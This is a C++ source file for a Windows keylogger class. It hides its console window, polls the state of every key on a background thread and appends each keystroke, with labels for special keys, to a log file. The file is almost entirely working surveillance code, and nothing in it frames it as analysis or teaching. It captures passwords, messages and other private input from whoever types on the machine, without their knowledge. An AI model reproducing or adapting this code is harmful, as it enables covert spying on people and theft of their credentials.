#include "Keylogger.hpp"

Keylogger::~Keylogger() {
    if (keyloggerThread.joinable())
        keyloggerThread.join();
}

void Keylogger::start(const std::string &filePath)
{
    logFilePath = filePath;
    if (running) return;
    running = true;
    keyloggerThread = std::thread(&Keylogger::captureKey, this);
}

void Keylogger::stop() {
    if (!running) return;
    running = false;
    if (keyloggerThread.joinable())
        keyloggerThread.join();
}

void Keylogger::captureKey() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    while (running) {
        for (int KEY = 8; KEY <= 190; KEY++) {
            if (GetAsyncKeyState(KEY) == -32767) {
                if (!logSpecialKey(KEY)) {
                    logKey(char(KEY));
                }
            }
        }
    }
}

void Keylogger::log(const std::string &input) {
    std::fstream logFile;
    logFile.open(logFilePath, std::fstream::app);
    if (logFile.is_open()) {
        logFile << input;
        logFile.close();
    } else {
       std::cerr << "Can't open file with path: " << logFilePath << '\n'; 
       exit(1);
    }
}

bool Keylogger::logSpecialKey(int key) {
    switch (key) {
        case VK_SPACE: log(" "); return true;
        case VK_RETURN: log("[ENTER]"); return true;
        case VK_SHIFT: log("[SHIFT]"); return true;
        case VK_BACK: log("[BACK_SPACE]"); return true;
        case VK_RBUTTON: log("[R_CLICK]"); return true;
        case VK_CAPITAL: log("[CAPS_LOCK]"); return true;
        case VK_TAB: log("[TAB]"); return true;
        case VK_UP: log("[UP_ARROW_KEY]"); return true;
        case VK_DOWN: log("[DOWN_ARROW_KEY]"); return true;
        case VK_LEFT: log("[LEFT_ARROW_KEY]"); return true;
        case VK_RIGHT: log("[RIGHT_ARROW_KEY]"); return true;
        case VK_CONTROL: log("[CONTROL]"); return true;
        case VK_MENU: log("[ALT]"); return true;
        case VK_LWIN: log("[WIN_KEY]"); return true;
        case VK_OEM_COMMA: log(","); return true;
        case VK_OEM_PERIOD: log("."); return true;
        case VK_OEM_1: log(";"); return true;
        case VK_OEM_2: log("/"); return true;
        case VK_OEM_3: log("`"); return true;
        case VK_OEM_4: log("["); return true;
        case VK_OEM_5: log("\\"); return true;
        case VK_OEM_6: log("]"); return true;
        case VK_OEM_7: log("'"); return true;
        case VK_F1: log("[F1]"); return true;
        case VK_F2: log("[F2]"); return true;
        case VK_F3: log("[F3]"); return true;
        case VK_F4: log("[F4]"); return true;
        case VK_F5: log("[F5]"); return true;
        case VK_F6: log("[F6]"); return true;
        case VK_F7: log("[F7]"); return true;
        case VK_F8: log("[F8]"); return true;
        case VK_F9: log("[F9]"); return true;
        case VK_F10: log("[F10]"); return true;
        case VK_F11: log("[F11]"); return true;
        case VK_F12: log("[F12]"); return true;
        case VK_NUMPAD0: log("0"); return true;
        case VK_NUMPAD1: log("1"); return true;
        case VK_NUMPAD2: log("2"); return true;
        case VK_NUMPAD3: log("3"); return true;
        case VK_NUMPAD4: log("4"); return true;
        case VK_NUMPAD5: log("5"); return true;
        case VK_NUMPAD6: log("6"); return true;
        case VK_NUMPAD7: log("7"); return true;
        case VK_NUMPAD8: log("8"); return true;
        case VK_NUMPAD9: log("9"); return true;
        case VK_MULTIPLY: log("*"); return true;
        case VK_ADD: log("+"); return true;
        case VK_DIVIDE: log("/"); return true;
        case VK_SUBTRACT: log("-"); return true;
        case VK_NUMLOCK: log("[NUM_LOCK]"); return true;
        default: return false;
    }
}